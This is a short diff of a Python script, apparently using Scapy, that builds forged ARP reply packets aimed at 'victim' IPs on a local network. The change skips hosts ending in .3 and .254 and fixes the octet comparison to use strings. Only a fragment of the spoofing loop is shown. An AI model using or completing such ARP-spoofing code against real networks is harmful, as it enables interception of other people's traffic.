@@ -86,7 +86,7 @@ if __name__ == "__main__":
             # send arp relies spoofing
             print(" ")
             for j in range(0,len(ip)):
-                if(ip[j].split(".")[3] != 3 and ip[j].split(".")[3] != 254):
+                if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
                     print(len(re.split(".",ip[j])))
                     victimpacket = ARP( op      =  2,
                                         pdst    = ip[j],            # victim's IP
